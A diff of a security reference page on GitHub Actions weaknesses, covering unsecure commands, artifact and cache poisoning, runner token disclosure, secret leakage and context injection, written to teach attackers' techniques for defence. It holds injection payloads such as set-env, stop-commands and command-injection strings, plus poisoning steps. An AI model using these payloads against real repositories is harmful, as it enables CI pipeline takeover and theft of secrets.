@@ -1,11 +1,11 @@
-# Abusing allowed unsecure commands
+# Allowed unsecure commands
 
-There are deprecated `set-env` and `add-path` commands that can be explicitly enabled by a user via setting the `ACTIONS_ALLOW_UNSECURE_COMMANDS` environment variable as `true`.
+There are deprecated `set-env` and `add-path` workflow commands that can be explicitly enabled by setting the `ACTIONS_ALLOW_UNSECURE_COMMANDS` environment variable to `true`.
 
-- `set-env` sets environment variables via the following workflow command: `::set-env name=<NAME>::<VALUE>`
-- `add-path` updates the `PATH` environment variable via the following workflow command: `::add-path::<VALUE>`
+- `set-env` sets environment variables via the following workflow command `::set-env name=<NAME>::<VALUE>`
+- `add-path` updates the `PATH` environment variable via the following workflow command `::add-path::<VALUE>`
 
-Depending on the use of the environment variable, this could enable an attacker to, at worst, modify the system path to run a different command than intended, resulting in arbitrary code execution. For example, let's consider the following workflow:
+Depending on the use of the environment variable, this could allow an attacker, in the worst case, to change the path and run a command other than the intended one, leading to arbitrary command execution. For example, consider the following workflow:
 
 ```yaml
 name: Vulnerable workflow
@@ -43,63 +43,191 @@ jobs:
           github-token: ${{ secrets.GITHUB_TOKEN }}
 ```
 
-This workflow prints the `github` context on the first step of the `deploy` job. Since some of the variables within the `github` context are controlled by a user and unsecure commands have been enabled, an attacker can use a PR description to set arbitrary environment variables. For instance, the following payload will set the `ENVIRONMENT_NAME` variable while printing the `github` context:
+The above workflow enables unsecure commands by setting `ACTIONS_ALLOW_UNSECURE_COMMANDS` to `true` in the `env` section. As can be seen, the first step of the `deploy` job prints the `github` context to the workflow log. Since part of the variables in the `github` context is user-controlled, it is possible to abuse unsecure commands to set arbitrary environment variables. For instance, an attacker could use the pull request description to deliver the following payload, which will reset the `ENVIRONMENT_NAME` when the `github` context is printed:
 
 ```
 \n::set-env name=ENVIRONMENT_NAME::", <YOUR_JS_CODE>//\n
 ```
 
-Github Runner will process this line as a worfklow command and set the variable to the malicious payload. The `actions/github-script` step injects the `ENVIRONMENT_NAME` variable using the expression `${{ }}` that allows an attacker to achive code injection.
+GitHub Runner will process this line as a workflow command and save a malicious payload to `ENVIRONMENT_NAME`. As a result, injecting the `ENVIRONMENT_NAME` variable within the `actions/github-script` step will lead to code injection.
 
 References:
 
 - [GHSA-mfwh-5m23-j46w: `add-path` and `set-env` Runner commands are processed via stdout](https://github.com/actions/toolkit/security/advisories/GHSA-mfwh-5m23-j46w)
 
+# Artifact poisoning
+
+There are many different cases where workflows use artifacts created by other workflows, for example, to get test results, a compiled binary, metrics, changes made, a pull request number, etc. This opens up another source for payload delivery. As a result, if an attacker can control the content of the downloaded artifacts and that content is not properly validated, it may lead to the execution of arbitrary commands. For example, consider the following workflows:
+
+```yaml
+# .github/workflows/pr.yml
+name: Pull request
+
+on:
+  pull_request:
+
+jobs:
+  build:
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+      # 1. Build a binary
+      - name: Build
+        run: make
+      # 2. Upload the binary to the artifacts
+      - name: Upload the compiled binary
+        uses: actions/upload-artifact@v3
+        with:
+          name: my_bin
+          path: ./my_bin
+```
+
+```yaml
+# .github/workflows/run.yml
+name: Run
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    steps:
+      # 1. Download a binary from the artefacts of the pr.yml workflow
+      - name: Download binary
+        uses: dawidd6/action-download-artifact@v2
+        with:
+          workflow: pr.yml
+          name: my_bin
+      # 2. Run the binary
+      - name: Run
+        run: ./my_bin
+```
+
+As can be seen, the first workflow uses the `pull_request` event to build a binary from an incoming pull request and upload the compiled binary to the artifacts. Since the workflow uses `pull_request` it can be triggered by a third-party user from a fork. Therefore, it is possible to upload a malicious binary to the artifacts. The second workflow uses the `workflow_dispatch`, downloads the binary from the `pr.yml` workflow and runs the binary. Even though the `run.yml` workflow is triggered manually, an attacker could execute arbitrary commands if they poisoned the artifacts just before triggering `run.yml`. In this case, the attack flow can look like this:
+
+1. An attacker forks the repository and makes malicious changes.
+1. An opens a pull request to the base repository.
+1. The `pr.yml` workflow checks out the code from the pull request, builds it and uploads the malicious binary to the artifacts.
+1. A maintainer triggers the `run.yml` workflow.
+1. The workflow downloads the malicious binary and runs it.
+
+Remember that the `pull_request` event may require approval from maintainers for pull requests from forks. By default, `pull_request` [requires approval only for first-time contributors](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories).
+
+References:
+
+- [Legit Security Blog: Novel Pipeline Vulnerability Discovered; Rust  Found Vulnerable](https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust)
+
+## How to detect downloading artifacts?
+
+There are several ways to download artifacts from another workflow. The most common ones can be found below:
+
+1. Using the `github.rest.actions.listWorkflowRunArtifacts()` method within the `actions/github-script` action:
+
+    ```yaml
+    - uses: actions/github-script@v6
+      with:
+        script: |
+          let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              run_id: context.payload.workflow_run.id,
+          });
+          let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => {
+              return artifact.name == "<ARTEFACT_NAME>"
+          })[0];
+          let download = await github.rest.actions.downloadArtifact({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              artifact_id: matchArtifact.id,
+              archive_format: 'zip',
+          });
+    ```
+
+1. Using third-party actions, such as [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact):
+
+    ```yaml
+    - uses: dawidd6/action-download-artifact@v2
+      with:
+        name: artifact_name
+        workflow: wf.yml
+    ```
+
+1. Using the `gh run download` GitHub CLI command:
+
+    ```yaml
+    - run: |
+        gh run download "${WORKFLOW_RUN_ID}" --repo "${GITHUB_REPOSITORY}" --name "artifact_name"
+    ```
+
+1. Using the `gh api` GitHub CLI command with `github.event.workflow_run.artifacts_url`:
+
+    ```yaml
+    run: |
+      artifacts_url=${{ github.event.workflow_run.artifacts_url }}
+      gh api "$artifacts_url" -q '.artifacts[] | [.name, .archive_download_url] | @tsv' | while read artifact
+      do
+        IFS=$'\t' read name url <<< "$artifact"
+        gh api $url > "$name.zip"
+        unzip -d "$name" "$name.zip"
+      done
+    ```
+
 # Cache poisoning
 
-Any cache in Github Actions [shares the same scope as the base branch](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#restrictions-for-accessing-a-cache). So, if there is a possibility to alter cached contents, you can poison the cache. In other words, whatever is cached from an incomming PR will be available in all workflows.
+Any cache in Github Actions [shares the same scope as the base branch](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#restrictions-for-accessing-a-cache). Therefore, if the cached content can be altered within the scope of the base branch, it is possible to poison the cache for all branches of the repository.
 
-You can reproduce it with the following steps:
+As a result, whatever is cached from an incoming pull request will be available in all workflows. You can reproduce this behaviour using the steps below.
 
-1. Create a workflow in a base repo with the next content:
+Poisoning:
+
+1. Create a workflow in a base repository with the next content:
 
     ```yml
+    name: PR Workflow
+
     on: pull_request_target
 
     jobs:
       poison:
         runs-on: ubuntu-latest
         steps:
-          - uses: actions/checkout@v2
+          - uses: actions/checkout@v3
             with:
               ref: ${{ github.event.pull_request.head.ref }}
           - uses: actions/cache@v2
             with:
               path: ~/poison
               key: poison_key
+          - run: |
+              cat poison
     ```
 
-2. Fork the repo and add `poison` file with arbitrary content
-3. Create a PR to the base repo and wait for the worflow to complete
-4. Create a new branch in the base repo and change any file, for example `README.md`
-5. Create a PR
-6. The workflow will retrieve the `poison` file from the step 2
+1. Fork the repository and add `poison` file with arbitrary content.
+1. Create a pull request to the base repository and wait for the workflow to complete.
 
-Moreover, Github Actions does not separate different [environments](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment). Let's say you have environments `development` and `production`, where `production` can only be run with approval. In this case, only certain people can run a workflow in `production` environment, while everyone else uses `development` environment. However, running these environments on the same branch can lead to cache poisoning in `production` environment, because there is a logical boundary only between branches. In other words, any developer with write permissions or an attacker who gains access to such account can poison the cache and get arbitrary code execution in `production` environments. Therefore, a developer or an attacker can at least gain access to `production` secrets.
+Exploitation:
 
-# Leak of Github Runner registration token
+1. Create a new branch in the base repository and change any file.
+1. Create a pull request to the base branch.
+1. The workflow will retrieve the `poison` file from the step 2 of the `Poisoning` section above.
 
-Github Actions supports self-hosted runners that you can deploy and manage to run jobs. In order to deploy a self-hosted runner, it must be registered in the Github Service.
+## Cache and deployment environments
 
-[The self-hosted runner registration process](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners) is the exchange of a Github Runner registration token for a temporary JWT token, and the subsequent generation of an RSA key that will be used by a self-hosted runner in the future to issue JWT tokens. Hence the Github Service allows self-hosted runners to be registered based on a Github Runner registration token and identifies a self-hosted runner afterwards by its public key.
+GitHub Actions does not separate different [deployment environments](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment) during caching. Suppose there are environments `development` and `production`, where `production` can only be run with approval. In this case, only certain people can run a workflow in the `production` environment, while everyone else uses the `development` environment. However, running these environments on the same branch can lead to cache poisoning in the `production` environment, because there is a logical boundary only between branches. In other words, an attacker (under certain circumstances) or any developer with write permissions can poison the cache of the base branch and get arbitrary code execution in the `production` environments. Therefore, an attacker or a developer can at least gain access to secrets from the `production` environment.
 
-The Github Runner registration token is a short-term token that has a 1 hour expiration time and it looks like this:
+# GitHub Runner registration token disclosure
+
+GitHub Actions supports self-hosted runners that users can deploy to run jobs. The deployment process includes registering a self-hosted runner on the GitHub Service. [The self-hosted runner registration process](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners) is the exchange of a GitHub Runner registration token for a temporary JWT token, and the subsequent generation of an RSA key that will be used by a self-hosted runner in the future to issue JWT tokens. Therefore, the GitHub Service allows self-hosted runners to be registered based on the GitHub Runner registration token and subsequently identifies the self-hosted runner by its public key.
+
+The GitHub Runner registration token is a short-term token that has a 1 hour expiration time and it looks like this:
 
 ```
 AUUYBYBGG5FM52VMJQPIF5DCNFBZA
 ```
 
-In the case of a Github Runner registration token leak, you can register a malicious runner, takeover jobs, and gain full access to secrets and code. Use the next request to check a registartion token (or follow the "[Adding self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners)" guide to add a malicious runner):
+In the case of a GitHub Runner registration token disclosure, an attacker can register a malicious runner, takeover jobs, and gain full access to secrets and code.
+
+You can use the next request to check a registration token (or):
 
 ```http
 POST /actions/runner-registration HTTP/1.1
@@ -114,78 +242,201 @@ Content-Type: application/json; charset=utf-8
 }
 ```
 
-# Leak of sensitive data
+For further exploitation follow the "[Adding self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners)" guide to add a malicious runner.
 
-Github actions write all details about a run to workflow logs, which include all running commands and their outputs. Logs of the public projects are available for everyone, and in the event of a leak of sensitive data to the logs, everyone can access this data.
+# Disclosure of sensitive data
 
-Sensitive data can be leaked for the following reasons:
-
-- Printing sensitive data to the logs
-
-    ```yaml
-    run: |
-      # print sensitive data received from the /user endpoint
-      curl --fail -H 'Authorization: Bearer ${{ secrets.GH_TOKEN }}' https://api.github.com/user || exit 1
-    ```
-
-- Running commands/scripts/apps in the verbose/debug mode
-
-    ```yaml
-    run: |
-      # curl in verbose mode will leak the Auth-Token header with an authentication token
-      curl -v -H "Auth-Token: $AUTH_TOKEN" https://api.website.com/
-    ```
-
-- Passing sensitive data (for instance, tokens or credentials) directly in command line
-
-    ```yaml
-    run: |
-      # hardcoded token
-      ./app --url api.website.com --token tETDURnbqsGTLtLB
-    ```
-
-- Misusing of sensitive data in workflows. New sensitive data may appear during execution of workflows. Github Actions allows you to mask this data in logs using [add-mask workflow command](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log). So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs
-
-    ```yaml
-    run: |
-      # TOKEN is not marked as sensitive data with add-mask
-      TOKEN=$(./issue_new_token)
-      # curl in verbose mode will leak TOKEN
-      curl -v -H "PRIVATE-TOKEN: $TOKEN" https://api.website.com
-    ```
-
-- All [output parameters](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#setting-an-output-parameter) which have not been marked as secrets will be logged if the [echoing](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#echoing-command-outputs) or [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled
-
-    ```yaml
-    // workflow or action that sets the output
-    run: |
-      echo "::set-output name=token::$(./get_token)"
-    ```
-
-    ```
-    // workflow run log that discloses the token in plaintext
-    ::set-output name=token::tETDURnbqsGTLtLB
-    ```
-
-[Byproducts of a workflow execution](https://docs.github.com/en/actions/advanced-guides) can also contain sensitive data:
-
-- [Artifacts](https://docs.github.com/en/actions/advanced-guides/storing-workflow-data-as-artifacts) in the public repositories are available to everyone for a retention period (90 days by default). Therefore, if sensitive data is leaked to artifacts, you can [download them](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts) and access the data.
-- Unlike artifacts, [cache](https://docs.github.com/en/actions/advanced-guides/caching-dependencies-to-speed-up-workflows) is only available while a workflow is running. However, anyone with read access can create a pull request on a repository and access the contents of the cache. Forks of a repository can also create pull requests on the base branch and access caches on the base branch.
+GitHub Actions write all details about a run to workflow logs, which include all running commands and their outputs. Logs of the public projects are available for everyone, and in sensitive data gets into the logs, everyone will be able to access this data. The same applies to [byproducts of workflow execution](https://docs.github.com/en/actions/advanced-guides).
 
 References:
 - [GitHub Docs: Security hardening - Using secrets](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-secrets)
 
-# Misuse of contexts
+## Printing sensitive output to workflow logs
 
-GitHub Actions workflows can be triggered by a variety of [events](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows). Every workflow trigger is provided with [contexts](https://docs.github.com/en/actions/learn-github-actions/contexts).
+The following example prints sensitive data received from the `/user` endpoint:
+
+```yaml
+- run: |
+    curl --fail -H 'Authorization: Bearer ${{ secrets.GH_TOKEN }}' https://api.github.com/user || exit 1
+```
+
+## Running commands in the verbose or debug mode
+
+The following example leaks the `Auth-Token` header due to the curl verbose `-v` key:
+
+```yaml
+- run: |
+    curl -v -H "Auth-Token: $AUTH_TOKEN" https://api.website.com/
+```
+
+## Misuse of sensitive data in workflows
+
+New sensitive data may appear during the execution of workflows, for example, received from a third-party service or vault. GitHub Actions provides the [add-mask](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log) workflow command to mask such data in the workflow logs. If the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak into the workflow logs.
+
+The following example does not mark `TOKEN` as sensitive using `add-mask` and `curl` will expose the `TOKEN` to the logs:
+
+```yaml
+- run: |
+    TOKEN=$(./issue_new_token)
+    curl -i -H "PRIVATE-TOKEN: $TOKEN" https://api.website.com
+```
+
+Remember that if you can control the variables that are printed in the workflow logs and there is a step that uses `add-mask` to mark new sensitive data, you can disable `add-mask` injection the [stop-commands](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) workflow command into the log.
+
+In the snippet below, an attacker could use the pull request description to deliver a payload and stop workflow command processing, which will cause the token to be exposed despite the `add-mask` being used.
+
+```yaml
+- run: |
+    print("""${{ toJSON(github) }}""")
+  shell: python
+- run: |
+    TOKEN=$(./issue_new_token)
+    echo "::add-mask::${TOKEN}"
+    curl -i -H "PRIVATE-TOKEN: $TOKEN" https://api.website.com
+```
+
+The payload may look like this:
+
+```
+\n::stop-commands::randomtoken\n
+```
+
+## Output parameters and debug mode
+
+All outputs not marked as private will be logged if debug mode is enabled.
+
+All [output parameters](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#setting-an-output-parameter) not marked as sensitive will be logged if the [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled.
+
+The following example will leak the tokens into the workflow logs if the `debug` mode is enabled:
+
+```yaml
+- run: |
+    # set output using deprecated set-output command
+    echo "::set-output name=token::$(./get_token)"
+    # set output using $GITHUB_OUTPUT file
+    echo "token=$(./get_token)" >> $GITHUB_OUTPUT
+```
+
+The workflow log discloses the token in plaintext:
+
+```
+::set-output name=token::cG1jTXaVaAT2K1Qur6G2dryZ6WfuCZcuGck3VU
+Warning: The `set-output` command is deprecated and will be disabled soon. Please upgrade to using Environment Files. For more information see: https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/
+##[debug]='cG1jTXaVaAT2K1Qur6G2dryZ6WfuCZcuGck3VU'
+##[debug]Set output token = uFlZdXxx5d2jXbTitxpq1FY8WsZTWtadcuFlZd
+```
+
+## Workflow artifacts
+
+[Artifacts](https://docs.github.com/en/actions/advanced-guides/storing-workflow-data-as-artifacts) in the public repositories are available to everyone for a retention period (90 days by default). Therefore, if sensitive data is leaked into artifacts, an attacker can [download](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts) them and the sensitive data inside.
+
+## Workflow cache
+
+Unlike artifacts, the [cache](https://docs.github.com/en/actions/advanced-guides/caching-dependencies-to-speed-up-workflows) is only available while a workflow is running. However, anyone with read access can create a pull request on a repository and access the contents of the cache. Forks can also create pull requests on the base branch and access caches on the base branch.
+
+## workflow_call secrets misusing
+
+When a job is used to call a reusable workflow, `jobs.<job_id>.secrets` can be used to provide a map of secrets that are passed to the called workflow. Under certain circumstances, the misuse of secrets can lead to the disclosure of sensitive data. Consider the following workflows:
+
+```yaml
+# dispatch.yml
+
+name: Dispatch
+
+on:
+  workflow_dispatch:
+
+jobs:
+  reusable:
+    uses: ./.github/workflows/reusable.yml
+    secrets:
+      creds: |
+        AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}
+        AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}
+```
+
+```yaml
+# reusable.yml
+
+name: Reusable
+
+on:
+  workflow_call:
+    secrets:
+      creds:
+        description: Arguments
+
+jobs:
+  reusable:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Parse creds
+        run: |
+          import os
+          creds = os.environ['CREDS']
+          creds = creds.split('\n')
+          print(f'ID: {creds[0].split("=")[-1]}')
+          print(f'KEY: {creds[1].split("=")[-1]}')
+        env:
+          CREDS: ${{ secrets.creds }}
+        shell: python
+```
+
+As can be seen, the `dispatch.yml` workflow invokes the `reusable.yml` reusable workflow and passes `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` using the `creds` secrets. The `reusable.yml` workflow parses the `creds` secrets and extracts the `AWS_SECRET_ACCESS_KEY` and `AWS_SECRET_ACCESS_KEY`. Even though `${{ secrets.creds }}` is masked in the logs, and `AWS_SECRET_ACCESS_KEY` and `AWS_SECRET_ACCESS_KEY` are stored in encrypted secrets, `reusable.yml` will reveal the ID and key in plain text.
+
+Is happens because [by default reusable workflows do not have access to the encrypted secrets](https://docs.github.com/en/enterprise-cloud@latest/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idsecretsinherit) and secrets must be defined via the `jobs.<job_id>.secrets`. As a result, if some sensitive data is extracted from the passed secrets, as in the example above, it can lead to their leakage into the workflow log.
+
+Below you can find one of the in-wild examples where the `docker/build-push-action` parses the npm credentials from the `build_args` and leaks them into the logs:
+
+```yaml
+name: build
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    uses: ./.github/workflows/build-docker.yaml
+    secrets:
+      build_args: |
+        NPM_EMAIL=${{ secrets.NPM_EMAIL }}
+        NPM_AUTH=${{ secrets.NPM_AUTH }}
+```
+
+```yaml
+# build-docker.yaml
+name: build-docker
+
+on:
+  workflow_call:
+    secrets:
+      build_args:
+        required: false
+
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    steps:
+      # ...
+      - uses: docker/build-push-action@v3
+        with:
+          build-args: ${{ secrets.build_args }}
+          # ...
+```
+
+# Contexts misusing
+
+GitHub Actions workflows can be triggered by a variety of [events](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows). Every workflow trigger is provided with [contexts](https://docs.github.com/en/actions/learn-github-actions/contexts). One of the contexts is the [GitHub context](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context) that contains information about the workflow run and the event that triggered the run.
 
 {% hint style="info" %}
-You can access context information using one of two [syntaxes](https://docs.github.com/en/actions/learn-github-actions/contexts#about-contexts):
-- Index syntax: `github['sha']`
-- Property dereference syntax: `github.sha`
+Context information can be accessed using one of two [syntaxes](https://docs.github.com/en/actions/learn-github-actions/contexts#about-contexts):
+- Index syntax `github['sha']`
+- Property dereference syntax `github.sha`
 {% endhint %}
 
-One of the contexts is the [GitHub context](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context) that contains information about the workflow run and the event that triggered the run. The next variables in the Github context can be controlled by a user who opens a PR from a forked repo, creates an issue, submits a comment to a PR, and etc.:
+The list below contains user-controlled GitHub context variables for various events.
 
 ```yaml
 # pull_request_target
@@ -220,7 +471,7 @@ github.event.workflow_run.head_commit.message
 github.event.workflow_run.head_repository.description
 ```
 
-GitHub Actions support their own [expression syntax](https://docs.github.com/en/actions/learn-github-actions/expressions) that allows access to the values of the workflow context.
+GitHub Actions support their own [expression syntax](https://docs.github.com/en/actions/learn-github-actions/expressions) that allows access to the context values.
 
 ```yaml
 - name: Check title
@@ -232,9 +483,9 @@ GitHub Actions support their own [expression syntax](https://docs.github.com/en/
     fi
 ```
 
-The [run:](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun) in the sample above generates a temporary script based on the template. The expressions inside of `${{ }}` are evaluated and substituted with the resulting values before the shell script is run which may lead to command injection. Therefore, an attacker can inject a bash commands in the example above using a payload like `a"; echo test` or `` `echo test` ``.
+The [run:](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun) block in the example above creates a bash script based on the content inside the block to execute the script during the `Check title` step execution. The content of the `run:` block is interpreted as a template and expressions inside `${{ }}` are evaluated and replaced with the resulting values before the bash script is run. Therefore, if an attacker can control a context variable that is used inside `${{ }}`, they will be able to inject arbitrary commands into the bash script. In the case above, an attacker can use the payloads like `a"; echo test` or `` `echo test` `` to execute malicious commands.
 
-Another context that can contain user-controlled data is the [env context](https://docs.github.com/en/actions/learn-github-actions/contexts#env-context). The `env` context contains environment variables that have been set in a workflow, job, or step. Using variable interpolation `${{ }}` with the `env` context data in a `run:` could allow an attacker to inject their own code into the runner:
+Another context that can contain user-controlled data is the [env context](https://docs.github.com/en/actions/learn-github-actions/contexts#env-context). The `env` context contains environment variables that have been set in a workflow, job, or step. Using variable interpolation `${{ }}` with the `env` context data in a `run:` could allow an attacker to inject malicious commands. In the snippet below, an attacker can create an issue with a payload in the issue title.
 
 ```yaml
 on:
@@ -256,11 +507,11 @@ jobs:
           fi
 ```
 
-Additionally, you can control values of the `outputs` property that is provided by [steps](https://docs.github.com/en/actions/learn-github-actions/contexts#steps-context) and [needs](https://docs.github.com/en/actions/learn-github-actions/contexts#needs-context) contexts:
+Additionally, it is possible to control values of the `outputs` property that is provided by [steps](https://docs.github.com/en/actions/learn-github-actions/contexts#steps-context) and [needs](https://docs.github.com/en/actions/learn-github-actions/contexts#needs-context) contexts:
 - [steps.<step_id>.outputs](https://docs.github.com/en/actions/learn-github-actions/contexts#steps-context)
 - [needs.<job_id>.outputs](https://docs.github.com/en/actions/learn-github-actions/contexts#needs-context)
 
-The `outputs` property contains the result/output of a specific job or step. `outputs` may accept user-controlled data which can be passed to the `run:`. In the following example it is possible to execute arbitrary commands by creating a PR named `` `;arbitrary_command_here();// `` because `steps.fetch-branch-names.outputs.prs-string` contains the title of PRs:
+The `outputs` property contains the result/output of a specific job or step. `outputs` may accept user-controlled data which can be passed to the `run:` block. In the following example, an attacker can execute arbitrary commands by creating a pull request named `` `;arbitrary_command_here();// `` because `steps.fetch-branch-names.outputs.prs-string` contains a pull request title:
 
 ```yml
 jobs:
@@ -304,15 +555,7 @@ jobs:
             // ...
 ```
 
-The same is applicable to [data that is sent to the pre and post actions](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#sending-values-to-the-pre-and-post-actions).
-
-Moreover, there are several github actions that, if misused, could lead to a vulnerability as well:
-
-| Github action | Description | Potential vulnerability |
-| --- | --- | --- |
-| [actions/github-script](https://github.com/actions/github-script) | Write workflows scripting the GitHub API in JavaScript | Using variable interpolation `${{ }}` with `script:` can lead to JavaScript code injection |
-| [octokit/graphql-action](https://github.com/octokit/graphql-action) | A GitHub Action to send queries to GitHub's GraphQL API | Using variable interpolation `${{ }}` with `query:` can lead to injection to a GraphQL request |
-| [octokit/request-action](https://github.com/octokit/request-action) | A GitHub Action to send arbitrary requests to GitHub's REST API | Using variable interpolation `${{ }}` with `route:` can lead to injection to a request to REST API |
+The same applies to [data that is sent to the pre and post actions](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#sending-values-to-the-pre-and-post-actions).
 
 References:
 - [GitHub Security Lab: Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
@@ -320,23 +563,33 @@ References:
 - [GitHub Security Lab: Hack this repository: The EkoParty 2020 GitHub CTF challenges](https://securitylab.github.com/research/ekoparty-ctf/)
 - [Writeup: Potential remote code execution in PyPI](https://blog.ryotak.me/post/pypi-potential-remote-code-execution-en/)
 
+## Potentially dangerous third-party actions
+
+Remember that injecting user-controlled data into variables of third-party actions can lead to vulnerabilities such as commands or code injection. Below you can find a list of the most common actions which, if misused, can lead to vulnerabilities.
+
+| Github action | Description | Potential vulnerability |
+| --- | --- | --- |
+| [actions/github-script](https://github.com/actions/github-script) | Write workflows scripting the GitHub API in JavaScript | Using variable interpolation `${{ }}` with `script:` can lead to JavaScript code injection |
+| [octokit/graphql-action](https://github.com/octokit/graphql-action) | A GitHub Action to send queries to GitHub's GraphQL API | Using variable interpolation `${{ }}` with `query:` can lead to injection to a GraphQL request |
+| [octokit/request-action](https://github.com/octokit/request-action) | A GitHub Action to send arbitrary requests to GitHub's REST API | Using variable interpolation `${{ }}` with `route:` can lead to injection to a request to REST API |
+
 # Misconfiguration of OpenID Connect
 
-With OpenID Connect, a GitHub Actions workflow requires a token in order to access resources in a cloud provider. The workflow requests an access token from a cloud provider, which checks the details presented by the JWT. If the trust configuration in the JWT is a match, a cloud provider responds by issuing a temporary token to the workflow, which can then be used to access resources in a cloud provider.
+With OpenID Connect, a GitHub Actions workflow requires a token to access resources in a cloud provider. The workflow requests an access token from a cloud provider, which checks the details presented by the JWT. If the trust configuration in the JWT is a match, a cloud provider responds by issuing a temporary token to the workflow, which can then be used to access resources in a cloud provider.
 
 When developers configure a cloud to trust GitHub's OIDC provider, they must add conditions that filter incoming requests, so that untrusted repositories or workflows can't request access tokens for cloud resources. `Audience` and `Subject` claims are typically used in combination while setting conditions on the cloud role/resources to scope its access to the GitHub workflows.
 
 - `Audience`: By default, this value uses the URL of the organization or repository owner. This can be used to set a condition that only the workflows in the specific organization can access the cloud role.
 - `Subject`: Has a predefined format and is a concatenation of some of the key metadata about the workflow, such as the GitHub organization, repository, branch or associated job environment. There are also many additional claims supported in the OIDC token that can also be used for setting these conditions.
 
-However, if a cloud provider is misconfigured, untrusted repositories can request access tokens for a cloud resources.
+However, if a cloud provider is misconfigured, untrusted repositories can request access tokens for cloud resources.
 
 References:
 - [GitHub Docs: About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
 
-# Misuse of the events related to incoming PRs
+# Misuse of the events related to incoming pull requests
 
-Github workflows can be triggered by events related to incoming pull requests:
+GitHub workflows can be triggered by events related to incoming pull requests. The table below contains all the events that can be used to handle incoming pull requests:
 
 | Event | REF | Possible `GITHUB_TOKEN` permissions | Access to secrets |
 | --- | --- | --- | --- |
@@ -346,17 +599,17 @@ Github workflows can be triggered by events related to incoming pull requests:
 | [issue_comment](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#issue_comment) | Default branch | write | yes |
 | [workflow_run](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) | Default branch | write | yes |
 
-- [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) and [pull_request_target](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request_target) triggered a workflow when activity on a pull request in the workflow's repository occurs. The main differences between the two triggers are:
+- [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) and [pull_request_target](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request_target) triggered a workflow when activity on a pull request in the workflow's repository occurs. The main differences between the two events are:
 
-  1. Workflows triggered via `pull_request_target` have write permission to the target repository and have access to target repository secrets. The same is true for workflows triggered on `pull_request` from a branch in the same repository, but not from external forks. The reasoning behind the latter is that it is safe to share the repository secrets if the user creating the PR has write permission to the target repository already.
-  2. `pull_request_target` runs in the context of the target repository of the pull request, rather than in the merge commit. This means the standard checkout action uses the target repository to prevent accidental usage of a user supplied code.
+  1. Workflows triggered via `pull_request_target` have write permissions to the target repository and have access to target repository secrets. The same is true for workflows triggered on `pull_request` from a branch in the same repository, but not from external forks. The reasoning behind the latter is that it is safe to share the repository secrets if the user has write permissions to the target repository already.
